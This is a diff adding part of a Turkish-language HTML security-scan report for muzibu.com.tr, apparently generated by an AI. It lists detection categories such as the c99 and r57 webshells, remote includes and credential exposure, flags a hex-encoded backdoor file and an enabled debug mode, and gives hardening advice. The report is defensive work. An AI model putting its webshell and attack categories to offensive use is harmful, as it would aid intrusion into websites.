+                            <td class="p-3 text-slate-400">Gzip, Chr, Base64, Preg</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-green-900/50 text-green-400 rounded text-xs">✓ Temiz</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">6.1-6.3</td>
+                            <td class="p-3 text-slate-300">Network</td>
+                            <td class="p-3 text-slate-400">Socket, Remote Include</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-green-900/50 text-green-400 rounded text-xs">✓ Temiz</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">7.1-7.4</td>
+                            <td class="p-3 text-slate-300">Sistem & Cron</td>
+                            <td class="p-3 text-slate-400">Cron, Htaccess, Permissions</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-green-900/50 text-green-400 rounded text-xs">✓ Temiz</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">8.1</td>
+                            <td class="p-3 text-slate-300">Zaman Bazlı</td>
+                            <td class="p-3 text-slate-400">Son 24 Saat PHP</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-green-900/50 text-green-400 rounded text-xs">✓ Normal geliştirme</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">9.1-9.2</td>
+                            <td class="p-3 text-slate-300">Özel Tehditler</td>
+                            <td class="p-3 text-slate-400">Crypto Miner, Mail Spam</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-green-900/50 text-green-400 rounded text-xs">✓ Temiz</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">10.1-10.4</td>
+                            <td class="p-3 text-slate-300">Dinamik Kod</td>
+                            <td class="p-3 text-slate-400">Variable Func, Call User Func</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-green-900/50 text-green-400 rounded text-xs">✓ Temiz</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">11.1-11.4</td>
+                            <td class="p-3 text-slate-300">Encoding</td>
+                            <td class="p-3 text-slate-400">Hex, Octal, Double Base64</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-red-900/50 text-red-400 rounded text-xs">🔴 BULGU: 453bbb9eb16f.php (hex)</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">12.1-12.4</td>
+                            <td class="p-3 text-slate-300">PHP Wrappers</td>
+                            <td class="p-3 text-slate-400">php://input, data://, filter</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-green-900/50 text-green-400 rounded text-xs">✓ Normal API kullanımı</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">13.1-13.4</td>
+                            <td class="p-3 text-slate-300">Webshell</td>
+                            <td class="p-3 text-slate-400">c99, r57, FilesMan, Cookie</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-green-900/50 text-green-400 rounded text-xs">✓ Temiz (AWS false positive)</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">14.1-14.4</td>
+                            <td class="p-3 text-slate-300">Config</td>
+                            <td class="p-3 text-slate-400">.user.ini, auto_prepend, SVG</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-green-900/50 text-green-400 rounded text-xs">✓ .user.ini normal</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">15.1-15.5</td>
+                            <td class="p-3 text-slate-300">Imunify360 Malware</td>
+                            <td class="p-3 text-slate-400">SEO Spam, Redirects, Defaced</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-green-900/50 text-green-400 rounded text-xs">✓ Temiz</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">16.1-16.5</td>
+                            <td class="p-3 text-slate-300">Imunify360 Gelişmiş</td>
+                            <td class="p-3 text-slate-400">Polymorphic, Time-based, IP</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-green-900/50 text-green-400 rounded text-xs">✓ Temiz</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">17.1-17.5</td>
+                            <td class="p-3 text-slate-300">Imunify360 Dosya</td>
+                            <td class="p-3 text-slate-400">Core Mods, Permissions, Size</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-green-900/50 text-green-400 rounded text-xs">✓ Temiz</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">18.1</td>
+                            <td class="p-3 text-slate-300">Imunify360 Davranış</td>
+                            <td class="p-3 text-slate-400">Mass File Creation</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-yellow-900/50 text-yellow-400 rounded text-xs">⚠️ 4,275 dosya (README + dev)</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">18.2-18.5</td>
+                            <td class="p-3 text-slate-300">Imunify360 Davranış</td>
+                            <td class="p-3 text-slate-400">Rapid Mods, Dynamic Include</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-green-900/50 text-green-400 rounded text-xs">✓ Temiz</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">19.1-19.5</td>
+                            <td class="p-3 text-slate-300">Info Disclosure</td>
+                            <td class="p-3 text-slate-400">.env, .git, Backup, SQL, phpinfo</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-green-900/50 text-green-400 rounded text-xs">✓ Public'te yok</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">20.1-20.5</td>
+                            <td class="p-3 text-slate-300">Credential Exposure</td>
+                            <td class="p-3 text-slate-400">API Keys, SSH Keys, DB Pass</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-green-900/50 text-green-400 rounded text-xs">✓ env() kullanımı (güvenli)</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">21.1-21.5</td>
+                            <td class="p-3 text-slate-300">Attack Patterns</td>
+                            <td class="p-3 text-slate-400">SQL Injection, XSS, Traversal</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-green-900/50 text-green-400 rounded text-xs">✓ Temiz</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">22.1</td>
+                            <td class="p-3 text-slate-300">Config Issues</td>
+                            <td class="p-3 text-slate-400">Debug Mode</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-red-900/50 text-red-400 rounded text-xs">🔴 APP_DEBUG=true</span></td>
+                        </tr>
+                        <tr class="hover:bg-slate-700/30">
+                            <td class="p-3 text-slate-500">22.2-22.5</td>
+                            <td class="p-3 text-slate-300">Config Issues</td>
+                            <td class="p-3 text-slate-400">Error Display, Credentials, Session</td>
+                            <td class="p-3"><span class="px-2 py-1 bg-green-900/50 text-green-400 rounded text-xs">✓ Temiz</span></td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <!-- 6. Teknik Detaylar -->
+        <section class="bg-blue-900/20 border border-blue-800 rounded-xl p-8">
+            <h2 class="text-2xl font-bold text-white mb-6">
+                🔧 Teknik Detaylar (Geliştiriciler İçin)
+            </h2>
+
+            <div class="space-y-6 text-slate-300">
+                <div>
+                    <h3 class="text-xl font-semibold text-white mb-3">📊 Tarama Parametreleri</h3>
+                    <ul class="space-y-2">
+                        <li><strong>Tarih:</strong> 12 Ocak 2026</li>
+                        <li><strong>Sistem:</strong> muzibu.com.tr (Tenant 1001)</li>
+                        <li><strong>Dizin:</strong> /var/www/vhosts/muzibu.com.tr/httpdocs</li>
+                        <li><strong>Toplam Kontrol:</strong> 90 (50 temel + 20 Imunify360 + 20 v5)</li>
+                        <li><strong>Hariç Tutulan:</strong> vendor/, storage/framework/</li>
+                        <li><strong>Süre:</strong> ~15 dakika</li>
+                    </ul>
+                </div>
+
+                <div>
+                    <h3 class="text-xl font-semibold text-white mb-3">🎯 Tespit Edilen Tehdit Türleri</h3>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <div class="bg-slate-800/50 border border-red-700 rounded-lg p-4">
+                            <h4 class="font-semibold text-red-400 mb-2">🔴 Kritik (2)</h4>
+                            <ul class="text-sm space-y-1">
+                                <li>• Backdoor/Webshell (453bbb9eb16f.php)</li>
+                                <li>• Debug Mode Active (APP_DEBUG=true)</li>
+                            </ul>
+                        </div>
+                        <div class="bg-slate-800/50 border border-yellow-700 rounded-lg p-4">
+                            <h4 class="font-semibold text-yellow-400 mb-2">⚠️ Şüpheli/Uyarı (3)</h4>
+                            <ul class="text-sm space-y-1">
+                                <li>• Marker Dosyası (d352f85e...txt)</li>
+                                <li>• Mass File Creation (4,275 dosya)</li>
+                                <li>• .user.ini (incelendi, normal)</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div>
+                    <h3 class="text-xl font-semibold text-white mb-3">🛠️ Kullanılan Araçlar</h3>
+                    <div class="grid grid-cols-2 md:grid-cols-4 gap-3">
+                        <div class="bg-slate-800/50 border border-slate-700 rounded p-3 text-center">
+                            <div class="text-2xl mb-1">🔍</div>
+                            <div class="text-sm">grep</div>
+                        </div>
+                        <div class="bg-slate-800/50 border border-slate-700 rounded p-3 text-center">
+                            <div class="text-2xl mb-1">📁</div>
+                            <div class="text-sm">find</div>
+                        </div>
+                        <div class="bg-slate-800/50 border border-slate-700 rounded p-3 text-center">
+                            <div class="text-2xl mb-1">📋</div>
+                            <div class="text-sm">cat</div>
+                        </div>
+                        <div class="bg-slate-800/50 border border-slate-700 rounded p-3 text-center">
+                            <div class="text-2xl mb-1">🌐</div>
+                            <div class="text-sm">curl</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div>
+                    <h3 class="text-xl font-semibold text-white mb-3">📝 İlgili Dosyalar</h3>
+                    <ul class="space-y-2 text-sm font-mono">
+                        <li class="text-red-400">• /public/assets/453bbb9eb16f.php → SİLİNMELİ!</li>
+                        <li class="text-yellow-400">• /public/d352f85e4598990f4c677cf5d1747f05.txt → SİLİNMELİ!</li>
+                        <li class="text-blue-400">• /.env → APP_DEBUG=false YAP!</li>
+                        <li class="text-green-400">• /.user.ini → Normal (dokunma)</li>
+                        <li class="text-slate-400">• /public/clear-cache.php → Normal</li>
+                        <li class="text-slate-400">• /public/opcache-reset.php → Normal</li>
+                        <li class="text-slate-400">• /public/productfeed.php → Normal</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- 7. Önleme Tavsiyeleri -->
+        <section class="bg-green-900/20 border border-green-800 rounded-xl p-8">
+            <h2 class="text-2xl font-bold text-white mb-6">
+                🛡️ Gelecekte Saldırıları Önleme
+            </h2>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <div class="bg-slate-800/50 border border-slate-700 rounded-lg p-6">
+                    <h3 class="text-lg font-semibold text-white mb-3">1️⃣ Şifre Değiştir</h3>
+                    <p class="text-slate-400 mb-3">Backdoor tespit edildiyse, tüm şifreleri değiştir:</p>
+                    <ul class="text-sm space-y-1 text-slate-300">
+                        <li>• FTP/SFTP şifresi</li>
+                        <li>• SSH şifresi</li>
+                        <li>• Database şifresi (.env)</li>
+                        <li>• Admin panel şifresi</li>
+                        <li>• API anahtarları (.env)</li>
+                    </ul>
+                </div>
+
+                <div class="bg-slate-800/50 border border-slate-700 rounded-lg p-6">
+                    <h3 class="text-lg font-semibold text-white mb-3">2️⃣ Upload Güvenliği</h3>
+                    <p class="text-slate-400 mb-3">uploads/ klasörüne .htaccess ekle:</p>
+                    <pre class="text-xs bg-slate-900 p-3 rounded text-green-400">
+# /public/uploads/.htaccess
+&lt;FilesMatch "\.php$">
+    Order Allow,Deny
+    Deny from all
+&lt;/FilesMatch>
+php_flag engine off</pre>
+                </div>
+
+                <div class="bg-slate-800/50 border border-slate-700 rounded-lg p-6">
+                    <h3 class="text-lg font-semibold text-white mb-3">3️⃣ WAF Aktif Et</h3>
+                    <p class="text-slate-400 mb-3">Web Application Firewall:</p>
+                    <ul class="text-sm space-y-1 text-slate-300">
+                        <li>• Cloudflare WAF (ücretsiz)</li>
+                        <li>• ModSecurity (Apache/Nginx)</li>
+                        <li>• Imunify360 (Plesk/cPanel)</li>
+                    </ul>
+                </div>
+
+                <div class="bg-slate-800/50 border border-slate-700 rounded-lg p-6">
+                    <h3 class="text-lg font-semibold text-white mb-3">4️⃣ Güncellemeler</h3>
+                    <p class="text-slate-400 mb-3">Sistem güncel tutulmalı:</p>
+                    <pre class="text-xs bg-slate-900 p-3 rounded text-green-400">
+composer update --with-dependencies
+npm update
+php artisan migrate</pre>
+                </div>
+
+                <div class="bg-slate-800/50 border border-slate-700 rounded-lg p-6">
+                    <h3 class="text-lg font-semibold text-white mb-3">5️⃣ Düzenli Tarama</h3>
+                    <p class="text-slate-400 mb-3">Haftada bir bu 90 kontrolü çalıştır:</p>
+                    <pre class="text-xs bg-slate-900 p-3 rounded text-green-400">
+# Cron job ekle
+0 3 * * 0 /path/to/security-scan.sh</pre>
+                </div>
+
+                <div class="bg-slate-800/50 border border-slate-700 rounded-lg p-6">
+                    <h3 class="text-lg font-semibold text-white mb-3">6️⃣ File Integrity Monitor</h3>
+                    <p class="text-slate-400 mb-3">Dosya değişikliklerini izle:</p>
+                    <pre class="text-xs bg-slate-900 p-3 rounded text-green-400">
+# AIDE, Tripwire, OSSEC kullan
+aide --init
+aide --check</pre>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="border-t border-slate-700 bg-slate-800/50 mt-12">
+        <div class="max-w-7xl mx-auto px-4 py-6 text-center text-slate-400 text-sm">
+            <p>🤖 Bu rapor <strong class="text-white">Claude AI</strong> tarafından oluşturulmuştur.</p>
+            <p class="mt-2">12 Ocak 2026 | 90 Kontrol Noktası | v5 Güvenlik Taraması</p>
+            <p class="mt-2 text-xs">
+                <a href="https://ixtif.com/readme/2026/01/02/guvenlik-tarama-rehberi/" class="text-blue-400 hover:text-blue-300">
+                    📚 Güvenlik Tarama Rehberi v5
+                </a>
+            </p>
+        </div>
+    </footer>
+
+</body>
+</html>
